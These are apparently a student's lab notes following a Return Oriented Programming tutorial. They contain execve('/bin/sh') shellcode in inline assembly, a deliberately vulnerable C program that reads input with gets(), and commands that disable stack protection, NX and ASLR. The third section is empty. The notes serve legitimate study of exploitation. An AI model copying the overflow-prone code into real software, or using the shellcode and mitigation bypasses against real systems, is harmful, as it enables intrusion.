# ROP - Return Oriented Programming 
> source: https://crypto.stanford.edu/~blynn/rop/

## 1. shell.c
- Goal:
    - An inline shell with c.
    ```c
    int main() {
     asm("\
    needle0: jmp there\n\
    here:    pop %rdi\n\
         xor %rax, %rax\n\
         movb $0x3b, %al\n\
         xor %rsi, %rsi\n\
         xor %rdx, %rdx\n\
         syscall\n\
    there:   call here\n\
    .string \"/bin/sh\"\n\
    needle1: .octa 0xdeadbeef\n\
    ");
    }
    ```
- GIF:
    -  ![1](https://github.com/justinfchin/CSrop/blob/master/gif/1.gif?raw)
- Notes:
    -  objdump - displays information from object files
- Problems:
    - I started this with Mac OS, but did not work so I switched to Ubuntu. 
---
## 2. Bad C Code
- Goal:
    -
    ```c
    #include <stdio.h>
    int main() {
        char name[64];
        puts("What's your name?");
        gets(name);
        printf("Hello, %s!\n", name);
        return 0;
    }
    ```
- GIF:
    -  ![2](https://github.com/justinfchin/CSrop/blob/master/gif/2.gif?raw)
- Notes:
    - cdecl calling is a convention for x86 
        - it is a low-level scheme for how parameters, return values, return addresses, and scope. [wiki](https://en.wikipedia.org/wiki/Calling_convention)
    - to get around the three countermeasures:
        1. GCC Stack-Smashing Protector (SSP)
            > $ gcc -fno-stack-protector -o victim victim.c
        2. Executable Space Protection (NX)
            ``` $ execstack -s victim ```
        3. Address Space Layout Randomization (ASLR)
            > setarch `arch` -R ./victim
    - setarch
        - changes the architecture 
- Problems:
    - execstack did not exist
        > sudo apt install execstack
 
---
 
## 3. Bad C Code
- Goal:
    -
    ```
    ```
- GIF:
    -
- Problems:
    -
---

- setarch 
    - changes the reported architecture in new program environment and set personality flags
